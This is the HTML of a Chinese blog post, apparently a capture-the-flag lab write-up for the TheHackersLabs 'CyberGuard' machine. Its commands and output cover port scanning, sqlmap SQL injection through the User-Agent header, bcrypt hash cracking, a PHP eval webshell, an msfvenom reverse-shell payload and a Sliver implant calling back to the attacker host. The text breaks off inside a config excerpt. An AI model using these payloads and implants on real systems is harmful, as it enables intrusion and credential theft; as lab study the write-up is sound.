<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="CyberGuard

 https://labs.thehackerslabs.com/machine/25
 



一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。



Recon

PortScan







枚举

`HTTP` 服务



目录爆破，这里扫描久了会被 ban 掉



这个 `query` 和输出结果感觉有股熟悉的味



`sqlmap` 跑一波

..." data-next-head=""/><meta property="og:title" content="TheHackersLabs - CyberGuard" data-next-head=""/><meta property="og:description" content="CyberGuard

 https://labs.thehackerslabs.com/machine/25
 



一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。



Recon

PortScan







枚举

`HTTP` 服务



目录爆破，这里扫描久了会被 ban 掉



这个 `query` 和输出结果感觉有股熟悉的味



`sqlmap` 跑一波

..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-07-28" data-next-head=""/><meta property="article:modified_time" content="2025-07-28" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="TheHackersLabs" data-next-head=""/><meta property="article:tag" content="Windows" data-next-head=""/><meta property="article:tag" content="Linux" data-next-head=""/><meta property="article:tag" content="MS17-010" data-next-head=""/><meta property="article:tag" content="Sliver" data-next-head=""/><meta property="article:tag" content="Sqlinjection" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="TheHackersLabs - CyberGuard" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard" data-next-head=""/><title data-next-head="">TheHackersLabs - CyberGuard</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-19a80ecec622553d.js" defer=""></script><script src="/_next/static/BhT_uiZI9tLUHe-4nDcBE/_buildManifest.js" defer=""></script><script src="/_next/static/BhT_uiZI9tLUHe-4nDcBE/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">TheHackersLabs - CyberGuard</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-07-28</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-07-28<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">TheHackersLabs</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Windows</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Linux</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">MS17-010</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Sliver</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Sqlinjection</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsCyberGuard","contentHtml":"\u003ch1\u003eCyberGuard\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/25\"\u003ehttps://labs.thehackerslabs.com/machine/25\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard nmap -sn 10.0.2.0/24                   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.0.2.1\nHost is up (0.00072s latency).\nMAC Address: 0A:00:27:00:00:11 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.0.2.10\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.0.2.20\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (3 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 2.21 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard nmap -sT -min-rate 10000 -p- 10.0.2.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.0.2.10\nHost is up (0.0013s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 13.54 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard nmap -sT -A -p 80 10.0.2.10                                                       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:12 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.0.2.10\nHost is up (0.00056s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx\n|_http-title: Site doesn\u003cspan class=\"hljs-string\"\u003e't have a title (application/octet-stream, text/plain; charset=UTF-8).\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): FreeBSD 11.X (92%)\nOS CPE: cpe:/o:freebsd:freebsd:11.2\nAggressive OS guesses: FreeBSD 11.2-RELEASE (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.56 ms 10.0.2.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.56 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eHTTP\u003c/code\u003e 服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录爆破，这里扫描久了会被 ban 掉\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://10.0.2.10\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.0.2.10\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 274]\n/index.php            (Status: 200) [Size: 1048]\n/search               (Status: 200) [Size: 2046]\n/admin                (Status: 302) [Size: 378] [--\u003e http://10.0.2.10/admin/auth/login]\n/up                   (Status: 200) [Size: 2130]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这个 \u003ccode\u003equery\u003c/code\u003e 和输出结果感觉有股熟悉的味\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esqlmap\u003c/code\u003e 跑一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esqlmap -r packet -batch --level 3 --risk 3\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e真跑出来了，在 \u003ccode\u003eUA\u003c/code\u003e 中存在注入点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eSQL Injection\u003c/h2\u003e\n\u003cp\u003e使用 \u003ccode\u003esqlmap\u003c/code\u003e 直接全给爆出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecurrent database: \u003cspan class=\"hljs-string\"\u003e'cyberguard\ncurrent user: '\u003c/span\u003eian@localhost\u003cspan class=\"hljs-string\"\u003e'\n\n+------------------------+\n| cache                  |\n| admin_menu             |\n| admin_operation_log    |\n| admin_permissions      |\n| admin_role_menu        |\n| admin_role_permissions |\n| admin_role_users       |\n| admin_roles            |\n| admin_user_permissions |\n| admin_users            |\n| blacklist_user_agents  |\n| cache_locks            |\n| failed_jobs            |\n| job_batches            |\n| jobs                   |\n| migrations             |\n| password_reset_tokens  |\n| sessions               |\n| users                  |\n+------------------------+\n\n# admin_user\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| 1  | Administrator | NULL   | $2y$12$fN2GC9IgrwHneBpWIY8WwevYshq/qkEhoE6XhU7ClZInAhbW2YltK | admin    | 2024-10-01 17:41:30 | 2024-10-09 02:31:19 | NULL           |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆破一下密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard john --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e       \nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 4096 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nkiller           (?)     \n1g 0:00:00:04 DONE (2025-07-27 21:48) 0.2415g/s 34.78p/s 34.78c/s 34.78C/s shadow..sandra\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到明文密码 \u003ccode\u003ekiller\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003cp\u003e来到网站后台尝试进行登录\u003c/p\u003e\n\u003cp\u003e成功进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e后台里面有个命令执行的功能（图中的 \u003ccode\u003eshell\u003c/code\u003e）\u003c/p\u003e\n\u003cp\u003e成功执行命令\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再拿 \u003ccode\u003e/etc/passwd\u003c/code\u003e 的信息，能知道 \u003ccode\u003eian\u003c/code\u003e 用户是存在的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eian:x:1000:1000:ian,,,:/home/ian:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e尝试 1 ❌\u003c/h3\u003e\n\u003cp\u003e尝试反弹 \u003ccode\u003eshell\u003c/code\u003e ，这里使用 \u003ccode\u003enc\u003c/code\u003e 和 \u003ccode\u003e/bin/bash\u003c/code\u003e 都无法弹出来，一直在加载\u003c/p\u003e\n\u003cp\u003e后台还有一个上传功能点，但是没找到上传的文件夹在哪\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试使用命令行来找到上传的文件夹在哪\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efind / -name \u003cspan class=\"hljs-string\"\u003e'result.php'\u003c/span\u003e 2\u003e/dev/null\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 find 命令能找到存放在 \u003ccode\u003e/var/www/cyberguard/storage/app/private/result.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再看一下当前目录在哪，在 \u003ccode\u003e/var/www/cyberguard/public\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们应该是没有办法切换过去\u003c/p\u003e\n\u003cp\u003e所以这里尝试直接写入\u003ccode\u003ewebshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;?php eval($_POST[\"x\"]);phpinfo();?\u003e'\u003c/span\u003e \u003e test.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以执行命令\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但结果还是无法进行反弹 \u003ccode\u003eshell\u003c/code\u003e ，被阻止\u003c/p\u003e\n\u003ch3\u003e尝试 2 ❌\u003c/h3\u003e\n\u003cp\u003e尝试使用 \u003ccode\u003eMSF\u003c/code\u003e 来拿到 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.20 LPORT=4444 -f elf -o sunset\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e selected, selecting \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 130 bytes\nFinal size of elf file: 250 bytes\nSaved as: sunset\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传后在命令执行窗口执行如下命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x /var/www/cyberguard/storage/app/private/sunset\n/var/www/cyberguard/storage/app/private/sunset\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里还尝试很多种\u003ccode\u003epayload\u003c/code\u003e ，例如\u003ccode\u003ecmd/linux/http/x64/meterpreter_reverse_http\u003c/code\u003e  等\u003c/p\u003e\n\u003cp\u003e但是结果和在 \u003ccode\u003eWebShell\u003c/code\u003e 反弹一样，被阻止了\u003c/p\u003e\n\u003ch3\u003e尝试 3 ✅\u003c/h3\u003e\n\u003cp\u003e这里尝试使用 \u003ccode\u003esliver\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/BishopFox/sliver\"\u003ehttps://github.com/BishopFox/sliver\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003esliver\u003c/code\u003e 有很高的隐蔽性和免杀性能，并且也支持其他的协议\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard sliver\nConnecting to localhost:31337 ...\n\n    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗\n    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗\n    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝\n    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗\n    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║\n    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝\n\nAll hackers gain persist\n[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405\n[*] Welcome to the sliver shell, please \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'help'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e options\n\n[*] Check \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e updates with the \u003cspan class=\"hljs-string\"\u003e'update'\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e\n\nsliver \u003e  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003eWireGuard\u003c/code\u003e 协议生成植入物并监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esliver \u003e generate --wg 10.0.2.20 -o linux -a amd64 -f binary\n\n[*] Generated unique ip \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e wg peer tun interface: 100.64.0.2\n[*] Generating new linux/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 1m12s\n[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/FORMIDABLE_FLOOR\n\nsliver \u003e wg\n\n[*] Starting Wireguard listener ...\n[*] Successfully started job \u003cspan class=\"hljs-comment\"\u003e#1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传到靶机并运行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x /var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR\n/var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后可以在 \u003ccode\u003esliver\u003c/code\u003e 服务端中看到连接上去了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e和 \u003ccode\u003eMSF\u003c/code\u003e 差不多的操作\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e内网渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e我们查看 \u003ccode\u003edatabases.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-string\"\u003e'default'\u003c/span\u003e =\u003e [\n            \u003cspan class=\"hljs-string\"\u003e'url'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'REDIS_URL'\u003c/span\u003e),\n            \u003cspan class=\"hljs-string\"\u003e'host'\u003c/span\u003e =\u003e \u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'REDIS_HOST'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'127.0.0.1'\u003c/span\u003e),\n            \u003cspan 